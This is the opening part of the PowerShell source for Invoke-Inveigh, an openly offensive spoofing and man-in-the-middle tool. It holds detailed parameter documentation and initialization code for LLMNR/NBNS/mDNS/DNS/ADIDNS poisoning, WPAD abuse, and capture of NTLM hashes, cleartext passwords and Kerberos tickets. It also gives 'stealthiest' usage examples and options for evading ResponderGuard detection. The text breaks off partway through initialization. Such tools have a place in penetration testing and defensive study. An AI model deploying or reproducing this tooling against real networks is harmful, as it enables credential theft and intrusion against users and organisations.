function Invoke-Inveigh
{
<#
.SYNOPSIS
This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer.

.DESCRIPTION
This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer/man-in-the-middle tool with
challenge/response capture over HTTP/HTTPS/Proxy/SMB.

.PARAMETER ADIDNS
Default = None: (Combo/NS/Wildcard) List of ADIDNS spoofing attacks. Combo looks at LLMNR/NBNS requests and adds
a record to DNS if the same request is received from multiple systems. NS injects an NS record and if needed, a target record.
This is primarily for the GQBL bypass for wpad. This attack can be used with Inveigh's DNS spoofer. Wildcard injects a wildcard record.

.PARAMETER ADIDNSACE
Default = Enabled: Enable/Disable adding an 'Authenticated Users' full control ACE to any added records.

.PARAMETER ADIDNSCleanup
Default = Enabled: Enable/Disable removing added ADIDNS records upon shutdown.

.PARAMETER ADIDNSCredential
PSCredential object that will be used with ADIDNS spoofing.

.PARAMETER ADIDNSDomain
The targeted domain in DNS format.

.PARAMETER ADIDNSDomainController
Domain controller to target. This parameter is mandatory on a non-domain attached system.

.PARAMETER ADIDNSForest
The targeted forest in DNS format.

.PARAMETER ADIDNSHostsIgnore
Comma separated list of hosts that will be ignored with ADIDNS spoofing.

.PARAMETER ADIDNSNSTarget
Default = wpad2: Target for the NS attacks NS record. An existing record can be used. 

.PARAMETER ADIDNSPartition
Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.

.PARAMETER ADIDNSThreshold
Default = 4: The threshold used to determine when ADIDNS records are injected for the combo attack. Inveigh will
track identical LLMNR and NBNS requests received from multiple systems. DNS records will be injected once the
system count for identical LLMNR and NBNS requests exceeds the threshold.

.PARAMETER ADIDNSTTL
Default = 600 Seconds: DNS TTL in seconds for added A records.

.PARAMETER ADIDNSZone
The ADIDNS zone.

.PARAMETER Challenge
Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
challenge will be generated for each request.

.PARAMETER ConsoleOutput
Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a
shell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.

.PARAMETER ConsoleQueueLimit
Default = Unlimited: Maximum number of queued up console log entries when not using the real time console. 

.PARAMETER ConsoleStatus
(Integer) Interval in minutes for displaying all unique captured usernames, hashes, and credentials. This is useful for
displaying full capture lists when running through a shell that does not have access to the support functions.

.PARAMETER ConsoleUnique
Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time console output is enabled.

.PARAMETER DNS
Default = Enabled: (Y/N) Enable/Disable DNS spoofing. All detected requests will be answered with the SpooferIP.
This is primarily required for the ADIDNS NS wpad attack.

.PARAMETER DNSTTL
Default = 30 Seconds: DNS TTL in seconds for the response packet.

.PARAMETER Elevated
Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh is running with
elevated privilege. If so, options that require elevated privilege can be used.

.PARAMETER EvadeRG
Defauly = Disabled: (Y/N) Enable/Disable detecting and ignoring LLMNR/NBNS requests sent directly to an IP address
rather than a broadcast/multicast address. This technique is used by ResponderGuard to discover spoofers across
subnets.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER FileOutputDirectory
Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must
also be enabled.

.PARAMETER FileUnique
Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time file output is enabled.

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPIP
Default = Any: IP address for the HTTP/HTTPS listener.

.PARAMETER HTTPPort
Default = 80: TCP port for the HTTP listener.

.PARAMETER HTTPAuth
Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type. This setting does not
apply to wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation. 

.PARAMETER HTTPBasicRealm
Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.

.PARAMETER HTTPContentType
Default = text/html: Content type for HTTP/HTTPS/Proxy responses. Does not apply to EXEs and wpad.dat. Set to
"application/hta" for HTA files or when using HTA code with HTTPResponse.

.PARAMETER HTTPDirectory
Full directory path to enable hosting of basic content through the HTTP/HTTPS listener.

.PARAMETER HTTPDefaultFile
Filename within the HTTPDirectory to serve as the default HTTP/HTTPS/Proxy response file. This file will not be used for
wpad.dat requests.

.PARAMETER HTTPDefaultEXE
EXE filename within the HTTPDirectory to serve as the default HTTP/HTTPS/Proxy response for EXE requests. 

.PARAMETER HTTPResponse
Content to serve as the default HTTP/HTTPS/Proxy response. This response will not be used for wpad.dat requests.
This parameter will not be used if HTTPDirectory is set. Use PowerShell character escapes and newlines where necessary.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store. If the script does not exit gracefully, manually remove the certificate. This feature requires
local administrator access.

.PARAMETER HTTPSPort
Default = 443: TCP port for the HTTPS listener.

.PARAMETER HTTPSCertIssuer
Default = Inveigh: The issuer field for the cert that will be installed for HTTPS.

.PARAMETER HTTPSCertSubject
Default = localhost: The subject field for the cert that will be installed for HTTPS.

.PARAMETER HTTPSForceCertDelete
Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and
HTTPSCertSubject.

.PARAMETER Inspect
(Switch) Inspect DNS/LLMNR/mDNS/NBNS traffic only.

.PARAMETER IP
Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/NBNS/mDNS/DNS spoofing
if the SpooferIP parameter is not set.

.PARAMETER Kerberos
Default = Disabled: (Y/N) Enable/Disable experimental Kerberos TGT capture and kirbi file output through unconstrained
delegation and packet sniffing. 

.PARAMETER KerberosCount
Default = 2: The number of kirbi files that will be created per username.

.PARAMETER KerberosCredential
Credentials that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosHash. The username
should be entered in Kerberos salt format:
AD username format = uppercase realm + case sensitive username (e.g., TEST.LOCALusername, TEST.LOCALAdministrator)
AD hostname format = uppercase realm + the word host + lowercase hostname without the trailing '$' + . + lowercase
realm (e.g., TEST.LOCALhostwks1.test.local)

.PARAMETER KerberosHash
AES256 password hash that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosCredential.

.PARAMETER KerberosHostHeader
Comma separated list of hosts that the HTTP/HTTPS/Proxy listener will compare to host headers. If a match is found, the
listener will attempt to negotiate to Kerberos.

.PARAMETER LogOutput
Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.

.PARAMETER LLMNR
Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.

.PARAMETER LLMNRTTL
Default = 30 Seconds: LLMNR TTL in seconds for the response packet.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER mDNS
Default = Disabled: (Y/N) Enable/Disable mDNS spoofing.

.PARAMETER mDNSTTL
Default = 120 Seconds: mDNS TTL in seconds for the response packet.

.PARAMETER mDNSTypes
Default = QU: Comma separated list of mDNS types to spoof. Note that QM will send the response to 224.0.0.251.
Types include QU = Query Unicast, QM = Query Multicast

.PARAMETER NBNS
Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.

.PARAMETER NBNSBruteForce
Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.

.PARAMETER NBNSBruteForceHost
Default = WPAD: Hostname for the NBNS Brute Force spoofer.

.PARAMETER NBNSBruteForcePause
Default = Disabled: (Integer) Number of seconds the NBNS brute force spoofer will stop spoofing after an incoming
HTTP request is received.

.PARAMETER NBNSBruteForceTarget
IP address to target for NBNS brute force spoofing.

.PARAMETER NBNSTTL
Default = 165 Seconds: NBNS TTL in seconds for the response packet.

.PARAMETER NBNSTypes
Default = 00,20: Comma separated list of NBNS types to spoof. Note, not all types have been tested.
Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name

.PARAMETER OutputStreamOnly
Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh through a shell that does not return other output streams. Note that you will not see the various
yellow warning messages if enabled.

.PARAMETER Pcap
Default = Disabled: (File/Memory) Enable/Disable dumping packets to a pcap file or memory. This option requires
elevated privilege. If using 'Memory', the packets will be written to the $inveigh.pcap ArrayList.

.PARAMETER PcapTCP
Default = 139,445: Comma separated list of TCP ports to filter which packets will be written to the pcap file.
Use 'All' to capture on all ports.

.PARAMETER PcapUDP
Default = Disabled: Comma separated list of UDP ports to filter which packets will be written to the pcap file.
Use 'All' to capture on all ports.

.PARAMETER Proxy
Default = Disabled: (Y/N) Enable/Disable proxy listener authentication captures.

.PARAMETER ProxyAuth
Default = NTLM: (Basic/NTLM/NTLMNoESS) Proxy listener authentication type.

.PARAMETER ProxyIP
Default = Any: IP address for the proxy listener.

.PARAMETER ProxyPort
Default = 8492: TCP port for the proxy listener.

.PARAMETER ProxyIgnore
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly
with the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is
cleared. Remove 'Firefox' from this list to attack Firefox. If attacking Firefox, consider setting
-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by
closing and reopening.

.PARAMETER RunCount
Default = Unlimited: (Integer) Number of NTLMv1/NTLMv2/cleartext captures to perform before auto-exiting.

.PARAMETER RunTime
(Integer) Run time duration in minutes.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER SMB
Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still
direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to
prevent login requests from being processed by the Inveigh host.  

.PARAMETER SpooferHostsIgnore
Comma separated list of requested hostnames to ignore when spoofing with LLMNR/mDNS/NBNS.

.PARAMETER SpooferHostsReply
Comma separated list of requested hostnames to respond to when spoofing with LLMNR/mDNS/NBNS.

.PARAMETER SpooferIP
IP address for ADIDNS/LLMNR/mDNS/NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the Inveigh host.

.PARAMETER SpooferIPsIgnore
Comma separated list of source IP addresses to ignore when spoofing with LLMNR/mDNS/NBNS.

.PARAMETER SpooferIPsReply
Comma separated list of source IP addresses to respond to when spoofing with LLMNR/mDNS/NBNS.

.PARAMETER SpooferLearning
Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Inveigh will send out
LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, Inveigh will add the
hostname to a spoofing blacklist.

.PARAMETER SpooferLearningDelay
(Integer) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through
SpooferLearning.

.PARAMETER SpooferLearningInterval
Default = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a
hostname that has already been checked if SpooferLearning is enabled.   

.PARAMETER SpooferNonprintable
Default = Enabled: (Y/N) Enable/Disable answering LLMNR/NBNS requests for non-printable host names.

.PARAMETER SpooferRepeat
Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user
challenge/response has been captured.

.PARAMETER SpooferThresholdHost
(Integer) Number of matching LLMNR/NBNS name requests to receive before Inveigh will begin responding to those
requests.

.PARAMETER SpooferThresholdNetwork
(Integer) Number of matching LLMNR/NBNS requests to receive from different systems before Inveigh will begin
responding to those requests. 

.PARAMETER StartupChecks
Default = Disabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER Tool
Default = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's
PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
0 = None, 1 = Metasploit/Meterpreter, 2 = Empire   

.PARAMETER WPADAuth
Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type for wpad.dat requests.
Setting to Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag
during negotiation.

.PARAMETER WPADAuthIgnore
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will be skipped for NTLM authentication. This can be used to filter out browsers that display login
popups for authenticated wpad.dat requests such as Firefox.   

.PARAMETER WPADDirectHosts
Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
defined proxy.

.PARAMETER WPADIP
Proxy server IP to be included in the wpad.dat response for WPAD enabled browsers. This parameter must be used
with WPADPort.

.PARAMETER WPADPort
Proxy server port to be included in the wpad.dat response for WPAD enabled browsers. This parameter must be
used with WPADIP.

.PARAMETER WPADResponse
Default = all direct: wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort
are set. Use PowerShell character escapes where necessary.

.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-Inveigh
Import full module and execute with all default settings.

.EXAMPLE
. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
Dot source load and execute specifying a specific local listening/spoofing IP.

.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -HTTP N
Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.

.EXAMPLE
Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76
Execute with the stealthiest options.

.EXAMPLE
Invoke-Inveigh -Inspect
Execute in order to only inspect LLMNR/mDNS/NBNS traffic.

.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be
useful for sending traffic to a controlled Linux system on another subnet.

.EXAMPLE
Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
Execute specifying an HTTP redirect response. 

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

#region begin parameters

# Parameter default values can be modified in this section: 
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Array]$ADIDNSHostsIgnore = ("isatap","wpad"),
    [parameter(Mandatory=$false)][Array]$KerberosHostHeader = "",
    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
    [parameter(Mandatory=$false)][Array]$PcapTCP = ("139","445"),
    [parameter(Mandatory=$false)][Array]$PcapUDP = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = "",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts = "",
    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "Firefox",
    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$ADIDNSThreshold = "4",
    [parameter(Mandatory=$false)][Int]$ADIDNSTTL = "600",
    [parameter(Mandatory=$false)][Int]$DNSTTL = "30",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
    [parameter(Mandatory=$false)][Int]$KerberosCount = "2",
    [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
    [parameter(Mandatory=$false)][Int]$mDNSTTL = "120",
    [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
    [parameter(Mandatory=$false)][Int]$NBNSBruteForcePause = "",
    [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
    [parameter(Mandatory=$false)][Int]$RunCount = "",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$WPADPort = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningDelay = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningInterval = "30",
    [parameter(Mandatory=$false)][Int]$SpooferThresholdHost = "0",
    [parameter(Mandatory=$false)][Int]$SpooferThresholdNetwork = "0",
    [parameter(Mandatory=$false)][String]$ADIDNSDomain = "",
    [parameter(Mandatory=$false)][String]$ADIDNSDomainController = "",
    [parameter(Mandatory=$false)][String]$ADIDNSForest = "",
    [parameter(Mandatory=$false)][String]$ADIDNSNS = "wpad",
    [parameter(Mandatory=$false)][String]$ADIDNSNSTarget = "wpad2",
    [parameter(Mandatory=$false)][String]$ADIDNSZone = "",
    [parameter(Mandatory=$false)][String]$HTTPBasicRealm = "ADFS",
    [parameter(Mandatory=$false)][String]$HTTPContentType = "text/html",
    [parameter(Mandatory=$false)][String]$HTTPDefaultFile = "",
    [parameter(Mandatory=$false)][String]$HTTPDefaultEXE = "",
    [parameter(Mandatory=$false)][String]$HTTPResponse = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
    [parameter(Mandatory=$false)][String]$NBNSBruteForceHost = "WPAD",
    [parameter(Mandatory=$false)][String]$WPADResponse = "function FindProxyForURL(url,host){return `"DIRECT`";}",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$ADIDNS,
    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$ADIDNSPartition = "DomainDNSZones",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ADIDNSACE = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ADIDNSCleanup = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$DNS = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$EvadeRG = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Kerberos = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$mDNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSBruteForce = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMB = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferLearning = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferNonprintable = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferRepeat = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$Elevated = "Auto",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$HTTPAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$mDNSTypes = @("QU"),
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
    [parameter(Mandatory=$false)][ValidateSet("File","Memory")][String]$Pcap = "",
    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$ProxyAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$KerberosHash,
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDirectory = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$ADIDNSCredential,
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$KerberosCredential,
    [parameter(Mandatory=$false)][Switch]$Inspect,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

#endregion
#region begin initialization
if($invalid_parameter)
{
    Write-Output "[-] $($invalid_parameter) is not a valid parameter"
    throw
}

$inveigh_version = "1.506"

if(!$IP)
{ 

    try
    {
        $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
    }
    catch
    {
        Write-Output "[-] Error finding local IP, specify manually with -IP"
        throw
    }

}

if(!$SpooferIP)
{
    $SpooferIP = $IP
}

if($ADIDNS)
{

    if(!$ADIDNSDomainController -or !$ADIDNSDomain -or $ADIDNSForest -or !$ADIDNSZone)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

        if(!$ADIDNSDomainController)
        {
            $ADIDNSDomainController = $current_domain.PdcRoleOwner.Name
        }
    
        if(!$ADIDNSDomain)
        {
            $ADIDNSDomain = $current_domain.Name
        }

        if(!$ADIDNSForest)
        {
            $ADIDNSForest = $current_domain.Forest
        }
    
        if(!$ADIDNSZone)
        {
            $ADIDNSZone = $current_domain.Name
        }

    }

}

if($HTTPDefaultFile -or $HTTPDefaultEXE)
{

    if(!$HTTPDirectory)
    {
        Write-Output "[-] You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE"
        throw
    }

}

if($Kerberos -eq 'Y' -and !$KerberosCredential -and !$KerberosHash)
{
    Write-Output "[-] You must specify a -KerberosCredential or -KerberosHash when enabling Kerberos capture"
    throw
}

if($WPADIP -or $WPADPort)
{

    if(!$WPADIP)
    {
        Write-Output "[-] You must specify a -WPADPort to go with -WPADIP"
        throw
    }

    if(!$WPADPort)
    {
        Write-Output "[-] You must specify a -WPADIP to go with -WPADPort"
        throw
    }

}

if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
{
    Write-Output "[-] You must specify a -NBNSBruteForceTarget if enabling -NBNSBruteForce"
    throw
}

if(!$FileOutputDirectory)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $FileOutputDirectory
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.enumerate = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
    $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.POST_request_list = New-Object System.Collections.ArrayList
    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
    $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})
    $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})
    $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})
    $inveigh.relay_history_table = [HashTable]::Synchronized(@{})
    $inveigh.request_table = [HashTable]::Synchronized(@{})
    $inveigh.session_socket_table = [HashTable]::Synchronized(@{})
    $inveigh.session_table = [HashTable]::Synchronized(@{})
    $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
    $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
    $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})
    $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
    $inveigh.group_table = [HashTable]::Synchronized(@{})
    $inveigh.session_count = 0
    $inveigh.session = @()
}

if($inveigh.running)
{
    Write-Output "[-] Inveigh is already running"
    throw
}

$inveigh.stop = $false

if(!$inveigh.relay_running)
{
    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.output_queue = New-Object System.Collections.ArrayList
    $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_session_table = [HashTable]::Synchronized(@{})
    $inveigh.console_input = $true
    $inveigh.console_output = $false
    $inveigh.file_output = $false
    $inveigh.HTTPS_existing_certificate = $false
    $inveigh.HTTPS_force_certificate_delete = $false
    $inveigh.log_output = $true
    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.POST_request_out_file = $output_directory + "\Inveigh-FormInput.txt"
}

if($Elevated -eq 'Auto')
{
    $elevated_privilege = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}
else
{
 
    if($Elevated -eq 'Y')
    {
        $elevated_privilege_check = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
        $elevated_privilege = $true
    }
    else
    {
        $elevated_privilege = $false
    }
    
}

if($StartupChecks -eq 'Y')
{

    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}

    if($HTTP -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }

    if($HTTPS -eq 'Y')
    {
        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
    }

    if($Proxy -eq 'Y')
    {
        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
    }

    if($DNS -eq 'Y' -and !$elevated_privilege)
    {
        $DNS_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
        $DNS_port_check = $false
    }

    if($LLMNR -eq 'Y' -and !$elevated_privilege)
    {
        $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
        $LLMNR_port_check = $false
    }

    if($mDNS -eq 'Y' -and !$elevated_privilege)
    {
        $mDNS_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
    }

}

if(!$elevated_privilege)
{

    if($HTTPS -eq 'Y')
    {
        Write-Output "[-] HTTPS requires elevated privileges"
        throw
    }

    if($SpooferLearning -eq 'Y')
    {
        Write-Output "[-] SpooferLearning requires elevated privileges"
        throw
    }

    if($Pcap -eq 'File')
    {
        Write-Output "[-] Pcap file output requires elevated privileges"
        throw
    }

    if(!$PSBoundParameters.ContainsKey('NBNS'))
    {
        $NBNS = "Y"
    }

    $SMB = "N"
}

$inveigh.hostname_spoof = $false
$inveigh.running = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Inspect)
{

    if($elevated_privilege)
    {
        $DNS = "N"
        $LLMNR = "N"
        $mDNS = "N"
        $NBNS = "N"
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }
    else
    {
        $HTTP = "N"
